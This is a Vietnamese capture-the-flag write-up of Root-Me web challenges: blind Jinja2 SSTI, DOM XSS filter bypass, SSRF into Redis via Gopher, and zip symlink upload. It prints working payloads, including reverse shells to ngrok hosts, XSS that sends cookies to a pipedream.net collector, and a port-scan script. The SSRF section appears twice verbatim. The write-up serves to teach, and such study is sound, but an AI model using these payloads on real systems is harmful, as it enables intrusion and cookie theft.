# Trần Mạnh Huy - task 1

* [1. Python - Blind SSTI Filters Bypass](#1-python---blind-ssti-filters-bypass)
* [2. XSS DOM Based - Filters Bypass](#2-xss-dom-based---filters-bypass)
* [3: SSRF - Server side request fogery](#3-ssrf---server-side-request-fogery)
* [4. Upload File - Zip](#4-upload-file-zip)

## 1. Python - Blind SSTI Filters Bypass

## 

```
Statement

This company’s site offers to apply for their private bug bounty program. To show them that you are the right candidate for them, exploit this app and find a way to get the flag!

```

Chall này ta có source code: 

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author             : Podalirius

import jinja2
from flask import Flask, flash, redirect, render_template, request, session, abort

mail = """
Hello team,

A new hacker wants to join our private Bug bounty program! Mary, can you schedule an interview?

 - Name: {{ hacker_name }}
 - Surname: {{ hacker_surname }}
 - Email: {{ hacker_email }}
 - Birth date: {{ hacker_bday }}

I'm sending you the details of the application in the attached CSV file:

 - '{{ hacker_name }}{{ hacker_surname }}{{ hacker_email }}{{ hacker_bday }}.csv'

Best regards,
"""

def sendmail(address, content):
    try:
        content += "\n\n{{ signature }}"
        _signature = """---\n<b>Offsec Team</b>\noffsecteam@hackorp.com"""
        content = jinja2.Template(content).render(signature=_signature)
    except Exception as e:
        pass
    return None

def sanitize(value):
    blacklist = ['{{','}}','{%','%}','import','eval','builtins','class','[',']']
    for word in blacklist:
        if word in value:
            value = value.replace(word,'')
    if any([bool(w in value) for w in blacklist]):
        value = sanitize(value)
    return value

app = Flask(__name__, template_folder="./templates/", static_folder="./static/")
app.config['DEBUG'] = False

@app.errorhandler(404)
def page_not_found(e):
    return render_template("404.html")

@app.route("/", methods=['GET','POST'])
def register():
    global mail
    if request.method == "POST":
        if "name" in request.form.keys() and len(request.form["name"]) != 0 and "surname" in request.form.keys() and len(request.form["surname"]) != 0 and "email" in request.form.keys() and len(request.form["email"]) != 0 and "bday" in request.form.keys() and len(request.form["bday"]) != 0 :
            if len(request.form["name"]) > 20:
                return render_template("index.html", error="Field 'name' is too long.")
            if len(request.form["surname"]) >= 50:
                return render_template("index.html", error="Field 'surname' is too long.")
            if len(request.form["email"]) >= 50:
                return render_template("index.html", error="Field 'email' is too long.")
            if len(request.form["bday"]) > 10:
                return render_template("index.html", error="Field 'bday' is too long.")
            try:
                register_mail = jinja2.Template(mail).render(
                    hacker_name=sanitize(request.form["name"]),
                    hacker_surname=sanitize(request.form["surname"]),
                    hacker_email=sanitize(request.form["email"]),
                    hacker_bday=sanitize(request.form["bday"])
                )
            except Exception as e:
                pass
            sendmail("offsecteam@hackorp.com", register_mail)
            return render_template("index.html", success="Thank you! Your application will be reviewed within a week.")
        else:
            return render_template("index.html", error="Missing fields in the application form!")
    elif request.method == 'GET':
        return render_template("index.html")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=59073)

```

#### Đầu tiên là template engine được sử dụng là jinja2. Có thể thấy form cho ta 4 tham số nhập: Name, Surface, Email address, Birth day. Và được pass qua santized() và có giới hạn độ dài:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/root03_01.jpg)

Ngoài ra còn có blacklist:

```
blacklist = ['{{','}}','{%','%}','import','eval','builtins','class','[',']']

```

Tuy vậy phân tích source code có thể nhận thấy rằng có 1 lỗ hổng có thể bypass qua hàm santized():

```
I'm sending you the details of the application in the attached CSV file:

 - '{{ hacker_name }}{{ hacker_surname }}{{ hacker_email }}{{ hacker_bday }}.csv'
 
 ```
 
Bằng việc tách payload SSTI để bypass của hàm santized sau đó khi qua thì chúng sẽ được nối lại với nhau và thực hiện được trong template engine.
Ta thực hiệ tách như sau:  

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab03_02.jpg)
 
Nhưng vì đây là blind SSTI, ta có thể thực hiện revershell đến ngrok của mình host.

> https://www.revshells.com/ : socat TCP:0.tcp.ap.ngrok.io:11193 EXEC:sh

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab03_03.jpg)

Lấy flag: 

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab03_04.jpg)

## 2. XSS DOM Based - Filters Bypass
Mở đầu vào ta có giao diện như sau, có thể nhập 1 số hay chữ bất kì vào, check source:

```
       <script>
        var random = Math.random() * (99);
        var number = '1';
        if(random == number) {
            document.getElementById('state').style.color = 'green';
            document.getElementById('state').innerHTML = 'You won this game but you don\'t have the flag ;)';
        }
        else{
            document.getElementById('state').style.color = 'red';
            document.getElementById('state').innerText = 'Sorry, wrong answer ! The right answer was ' + random;
        }
        </script>
        
 ```
 
 Vậy ta cần phải bypass qua hàm eval để thực hiện alert trước đã, trang web filter vài cái là <>, +, ; , nhưng kh quan trọng lm vì ta đang ở trong script, chỉ cần thóat ra khỏi hàm eval là được,
  ta có thể dùng %0A để xuống dòng hoặc**&&** để nó thực hiện cái sau mình muốn là alert luôn:
 
 > Payload: 1' && alert(1)// | 1'%0Aalert(1)//

![image](https://user-images.githubusercontent.com/104350480/218234081-059d00f4-65ec-4058-a028-3b7de13f0491.png)

Vậy là đã alert thành công, tấn công tiếp thôi.
Nhưng khi thử tiếp các request như các chall khác thì vấn đề nữa xảy ra là sau khi fuzz 1 hồi thì biết nó đang filter từ http

![image](https://user-images.githubusercontent.com/104350480/218234822-0802dee3-5ab7-4d69-8ecf-5f47d409362b.png)

Lúc này mình có ý tưởng là dùng document.URL để cắt http ra rồi nối chuỗi bằng concat để thực hiện tấn công, chú ý nữa là bài có filter cả dấu **"** , khi gửi đọc source code ta thấy bị filter đi mất, vì vậy có thể thay bằng dấu **'**

```
Payload: 1'%0Adocument.location=document.URL.slice(0,7).concat('eo7xxasp6lhfvaj.m.pipedream.net?c=').concat(document.cookie)//

Hoặc dùng hàm eval: 1' && eval(document.location=document.URL.slice(0,7).concat('eo7xxasp6lhfvaj.m.pipedream.net/?c=').concat(document.cookie))//

```

Chuyển trang thành công rồi thì ta gửi cho server ở phần contact rồi đợi admin nhấn thôi:

> http://challenge01.root-me.org/web-client/ch33/?number=1%27+%26%26+eval%28document.location%3Ddocument.URL.slice%280%2C7%29.concat%28%27eo7xxasp6lhfvaj.m.pipedream.net%2F%3Fc%3D%27%29.concat%28document.cookie%29%29%2F%2F

>Flag: rootme{FilTERS_ByPass_DOm_BASEd_XSS}



## 3: SSRF - Server side request fogery


```
Statement
Objectif final : Get root privileges on SSRF box CTF All The Day to read the flag in the /root directory !
Validation flag is stored in the file /passwd

```
Ở đây web app cho mình nhập một url và nó sẽ thực hiện crawl dữ liệu từ cái url về, thử với đường dẫn http://youtube.com 

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_01.jpg)

Để test lỗ hổng ssrf, ta có thể fuzz qua payload như: file:///etc/passwd  để thử đọc file có trên web server bằng cách sử dụng giao thức đọc file.

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_02.jpg)

Nhưng bằng cách này thì mình không thể đọc các file root mà chỉ có thể đọc được các file trong quyền của mình, nên sẽ kh đọc được flag. Vì vậy mình tiếp tục fuzz tiếp xem những port nào trên local đang chạy. Ở đây mình có thể dùng  Intruder của burp để phát hiện các cổng dịch vụ đang mở hoặc dùng script:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_03.jpg)

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_04.jpg)



### Hoặc script:

```
import threading,requests
from queue import Queue
 
def scan(port):
    h={"Content-Type": "application/x-www-form-urlencoded",}
    url= "http://ctf09.root-me.org/index.php"
    data={"url":f"localhost:{port}"}
    r= requests.post(url,data=data)
    if "Connection refused" not in r.text:
        print(f"[+] FOUND AT PORT: {port}")
 
def threader():
    while True:
        worker = q.get()
        scan(worker)
        q.task_done()
 
q = Queue()
for i in range(100):
    t = threading.Thread(target=threader)
    t.daemon = True
    t.start()
 
for worker in range(1, 10000):
    q.put(worker)
 
q.join()

```

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_05.jpg)

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_06.jpg)


Sau khi fuzz qua, mình sẽ thấy được server nó đang dùng redis chạy với port 6379. Thông thường Redis service sẽ được chạy với đặc quyền root trong intranet và mình có thể sử dụng giao thức Gopher để lợi dụng điều đó.

```
Theo mặc định, Redis sẽ bị ràng buộc với 0.0.0.0:6379. Nếu các chính sách liên quan không được thông qua, chẳng hạn như thêm quy tắc tường lửa để tránh truy cập ip nguồn không đáng tin cậy khác, v.v., điều này sẽ hiển thị dịch vụ Redis cho mạng công cộng. Nếu không đặt xác thực mật khẩu (thường là trống), nó sẽ khiến bất kỳ người dùng nào truy cập Redis mà không được phép nếu họ có thể truy cập máy chủ mục tiêu và Đọc dữ liệu từ Redis.
Do đó, lỗ hổng này có thể sử dụng SSRF để bỏ qua các hạn chế liên kết cục bộ mà không cần định cấu hình mật khẩu, để tấn công các ứng dụng mạng nội bộ trên mạng bên ngoài.

```

Mình sẽ sử dụng tool tên là Gopherus để tạo ra payload reverse shell. Ngoài ra mình cũng sẽ sử dụng ngrok để thực hiện forward kết nối đến local interface của mình
> link tool:https://github.com/tarunkant/Gopherus

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_07.jpg)

```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2472%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/0.tcp.ap.ngrok.io/13392%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A

```
Nếu decode nó ra, mình có thể thấy nó là gói dữ liệu TCP của reverseShell được viết bằng bash.

Giờ thì ném payload lên và chờ sẵn ở port 1234. Chờ 1 lúc cũng được:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_08.jpg)

Đọc được flag:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_09.jpg)


> Flag: SSRF_PwNiNg_v1@_GoPh3r_1s_$o_c00l!

```
Statement
Objectif final : Get root privileges on SSRF box CTF All The Day to read the flag in the /root directory !
Validation flag is stored in the file /passwd

```
Ở đây web app cho mình nhập một url và nó sẽ thực hiện crawl dữ liệu từ cái url về, thử với đường dẫn http://youtube.com 

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_01.jpg)

Để test lỗ hổng ssrf, ta có thể fuzz qua payload như: file:///etc/passwd  để thử đọc file có trên web server bằng cách sử dụng giao thức đọc file.

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_02.jpg)

Nhưng bằng cách này thì mình không thể đọc các file root mà chỉ có thể đọc được các file trong quyền của mình, nên sẽ kh đọc được flag. Vì vậy mình tiếp tục fuzz tiếp xem những port nào trên local đang chạy. Ở đây mình có thể dùng  Intruder của burp để phát hiện các cổng dịch vụ đang mở hoặc dùng script:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_03.jpg)

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_04.jpg)



### Hoặc script:

```
import threading,requests
from queue import Queue
 
def scan(port):
    h={"Content-Type": "application/x-www-form-urlencoded",}
    url= "http://ctf09.root-me.org/index.php"
    data={"url":f"localhost:{port}"}
    r= requests.post(url,data=data)
    if "Connection refused" not in r.text:
        print(f"[+] FOUND AT PORT: {port}")
 
def threader():
    while True:
        worker = q.get()
        scan(worker)
        q.task_done()
 
q = Queue()
for i in range(100):
    t = threading.Thread(target=threader)
    t.daemon = True
    t.start()
 
for worker in range(1, 10000):
    q.put(worker)
 
q.join()

```

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_05.jpg)

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_06.jpg)


Sau khi fuzz qua, mình sẽ thấy được server nó đang dùng redis chạy với port 6379. Thông thường Redis service sẽ được chạy với đặc quyền root trong intranet và mình có thể sử dụng giao thức Gopher để lợi dụng điều đó.

```
Theo mặc định, Redis sẽ bị ràng buộc với 0.0.0.0:6379. Nếu các chính sách liên quan không được thông qua, chẳng hạn như thêm quy tắc tường lửa để tránh truy cập ip nguồn không đáng tin cậy khác, v.v., điều này sẽ hiển thị dịch vụ Redis cho mạng công cộng. Nếu không đặt xác thực mật khẩu (thường là trống), nó sẽ khiến bất kỳ người dùng nào truy cập Redis mà không được phép nếu họ có thể truy cập máy chủ mục tiêu và Đọc dữ liệu từ Redis.
Do đó, lỗ hổng này có thể sử dụng SSRF để bỏ qua các hạn chế liên kết cục bộ mà không cần định cấu hình mật khẩu, để tấn công các ứng dụng mạng nội bộ trên mạng bên ngoài.

```

Mình sẽ sử dụng tool tên là Gopherus để tạo ra payload reverse shell. Ngoài ra mình cũng sẽ sử dụng ngrok để thực hiện forward kết nối đến local interface của mình
> link tool:https://github.com/tarunkant/Gopherus

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_07.jpg)

```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2472%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/0.tcp.ap.ngrok.io/13392%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A

```
Nếu decode nó ra, mình có thể thấy nó là gói dữ liệu TCP của reverseShell được viết bằng bash.

Giờ thì ném payload lên và chờ sẵn ở port 1234. Chờ 1 lúc cũng được:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_08.jpg)

Đọc được flag:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssrf_rootme/ssrf_09.jpg)


> Flag: SSRF_PwNiNg_v1@_GoPh3r_1s_$o_c00l!


4. Upload File - Zip

```
Your goal is to read index.php file

```
![image](https://user-images.githubusercontent.com/104350480/218240598-e6d84d9a-b167-4b46-82cd-8cbdcde84287.png)


Chall này chỉ cho phép ta thực hiện upload mỗi zip file và sau đó sẽ extract file zip đó. Vậy làm sao mà từ việc upload file zip mà sang đọc được content của index.php? Ở đây có thể dùng 1 phương pháp đó là sử dụng symlink

```
Lệnh Ln trong Linux cho phép người dùng tạo liên kết giữa các tệp khác nhau vào một thư mục. Lệnh Ln mặc định sẽ tạo ra các liên kết cứng. Để tạo liên kết tượng trưng, hãy sử dụng tùy chọn -s (–symbolic)

```
Ta hiểu đơn giản nó như 1 file shortcut vậy, vậy việc cần làm là đầu tiên ta sẽ tạo 1 symlink liên kết đến file index.php, sau đó ta đóng zip file đó lại rồi upload nó (ta có thể zip file symlink nếu dùng flag -y aka –symlink)

cmd: 
> ln -s ../../../index.php symlink.txt; zip --symlinks index.zip index.txt 

Và sau khi upload thành công, bên server đã extract cái file zip đó và khiến cái file symlink của mình trỏ đến file index.php của server, ta được file index.txt

![image](https://user-images.githubusercontent.com/104350480/218240532-31cfafc3-b304-472a-afec-4c00de34d606.png)

![image](https://user-images.githubusercontent.com/104350480/218240544-15d51acf-0b68-4014-8ca0-522dbb30f162.png)

Ta có được flag: 

>N3v3r_7rU5T_u5Er_1npU7

## 5. SQL injection – Blind





